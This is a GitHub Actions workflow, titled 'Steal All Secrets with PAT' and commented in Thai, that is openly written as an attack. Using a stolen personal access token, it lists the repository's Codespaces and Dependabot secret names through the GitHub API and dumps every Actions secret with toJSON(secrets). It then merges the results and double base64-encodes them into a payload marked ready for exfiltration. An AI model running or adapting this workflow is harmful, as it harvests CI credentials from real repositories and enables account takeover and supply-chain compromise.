name: Steal All Secrets with PAT
on: workflow_dispatch
jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - name: Steal with PAT
        env:
          PAT: ${{ secrets.ATTACKER_PAT }}  # PAT ที่ขโมยมา
        run: |
          echo "Stealing Codespaces secrets..."
          curl -H "Authorization: token $PAT" \
            "https://api.github.com/repos/$GITHUB_REPOSITORY/codespaces/secrets" \
            | jq -r '.secrets[].name' > codespaces.txt

          echo "Stealing Dependabot secrets..."
          curl -H "Authorization: token $PAT" \
            "https://api.github.com/repos/$GITHUB_REPOSITORY/dependabot/secrets" \
            | jq -r '.secrets[].name' > dependabot.txt

          echo "Stealing Actions secrets..."
          echo '${{ toJSON(secrets) }}' > actions.json

          # รวมทุกอย่าง
          cat *.txt actions.json > all-secrets.txt
          cat all-secrets.txt | base64 -w 0 | base64 -w 0 > payload.txt
          echo "Payload ready for exfil"
